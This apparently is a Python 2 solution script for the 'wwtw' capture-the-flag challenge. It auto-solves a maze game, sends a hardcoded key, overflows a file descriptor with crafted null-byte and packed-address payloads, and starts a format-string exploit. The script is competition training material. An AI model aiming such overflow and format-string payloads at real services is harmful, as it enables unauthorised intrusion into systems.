#!/usr/bin/python

import time
import os
import socket
import struct

NORTH='w'
SOUTH='s'
EAST='d'
WEST='a'

#HOST='wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me'
HOST='localhost'
PORT=2606

tardiskey = "UeSlhCAGEp"

retry = True

def playgame(gameboard, conn):
	rows = gameboard.splitlines()
	exit = []
	player = []
	for g in range(len(rows)):
		columns = list(rows[g])
		for p in range(len(columns)):
			if 'E' in columns[p]:
				exit = [g,p]
			if 'T' in columns[p]:
				exit = [g,p]
			if 'V' in columns[p]:
				player = [g,p,0]
			if '<' in columns[p]:
				player = [g,p,1]
			if '^' in columns[p]:
				player = [g,p,2]
			if '>' in columns[p]:
				player = [g,p,3]

	# play the game one move
	# if player is south of the exit
	if player[0] > exit[0]:
		conn.send(NORTH + "\n")
	# if player is north of the exit
	elif player[0] < exit[0]:
		conn.send(SOUTH + "\n")
	# if player is east of the exit
	elif player[1] > exit[1]:
		conn.send(WEST + "\n")
	# if player is west of the exit
	elif player[1] < exit[1]:
		conn.send(EAST + "\n")

def overflowfd(conn):
	print "[+] Part 2: Overflow the filedescriptor"
	nullpayload = "1" + "\x00" * 8
	conn.send(nullpayload)
	print "[+] Sent first payload..."
	conn.recv(1024)
	conn.recv(1024)
	time.sleep(2)
	ll = struct.pack("I",0x55592b6e)
	conn.recv(1)
	conn.send(ll * 9)
	print "[+] Sent second payload..."
	conn.recv(4096)
	while True:
		conn.send(nullpayload)
		print "[+] Looping payload..."
		result = conn.recv(1024)
		if "console is online" in result:
			break
	print "[+] Console online"
	conn.recv(1024)

def dematerialize(conn):
	print "[+] Part 3: Exploit the format string:"
	while True:
		conn.send("3\n")
		coordsprompt = conn.recv(1024)
		if "Coordinates:" in coordsprompt:
			print "[+] Got coordinates prompt"
			break
	conn.send("AAAA" + "08lx" * 8)
	

def parsemessage(message, conn):
	global retry

	if '012345' in message:
		initstate = conn.recv(1024)
		initstate = message + initstate
		return initstate
	elif 'You escap' in message:
		print "[+] Found the exit ok, another room to solve..."	
		initstate = conn.recv(1024)
		return initstate
	elif 'Invalid' in message:
		print "[?] Got invalid message"
		initstate = conn.recv(1024)
		return initstate
	elif 'Enjoy 196' in message:
		print "[-] Touched an angel :("
 		conn.close()
		return False
	elif 'Finally...the' in message:
		print "[+] Reached the Tardis room..."
		initstate = conn.recv(1024)
		return initstate
	elif 'TARDIS KE' in message:
		retry = False
		conn.recv(1024)
		print "[+] Got Tardis key prompt..."
		conn.send(tardiskey + "\n")
		print "[+] Sent key: " + tardiskey
		overflowfd(conn)
		dematerialize(conn)
	else:
		initstate = conn.recv(4096)
		return initstate




print "[+] Part 1: Win the game"
while retry == True:
	print "[+] Connecting to server..."
	conn = socket.create_connection((HOST,PORT))
	initstate = conn.recv(183) # 183 byte banner
	while initstate:
		firstline = conn.recv(10)
		initstate = parsemessage(firstline, conn)
		if initstate:
			playgame(initstate, conn)
	
	conn.close()
